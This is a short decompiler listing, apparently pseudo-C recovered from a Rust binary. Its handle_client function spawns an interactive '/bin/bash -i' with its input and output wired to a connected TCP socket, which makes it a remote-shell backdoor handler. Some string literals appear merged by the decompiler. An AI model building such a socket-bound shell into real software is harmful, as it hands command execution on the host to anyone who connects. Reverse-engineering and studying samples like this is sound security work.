int server::handle_client(unsigned int a0)
{
    char v0;  // [bp-0x11c]
    char v1;  // [bp-0x100]
    char v2;  // [bp-0xe0]
    unsigned long long v4;  // rax
    unsigned long long v5;  // rax
    unsigned long long v6;  // rax
    unsigned long long v7;  // rax

    v2.new("/bin/bash-isrc/main.rs", 9);
    v4 = v2.arg("-isrc/main.rs", 2);
    v5 = v4.stdin(3, (unsigned int)a0.from_raw_fd());
    v6 = v5.stdout(3, (unsigned int)a0.from_raw_fd());
    v7 = v6.stderr(3, (unsigned int)a0.from_raw_fd());
    v1.spawn(v7);
    v0.unwrap(&v1);
    v1.wait(&v0);
    v1.unwrap();
    core::ptr::drop_in_place<std::process::Child>(&v0);
    core::ptr::drop_in_place<std::process::Command>(&v2);
    return ::0x40d400::core::ptr::drop_in_place<std::net::tcp::TcpStream>(a0);
}
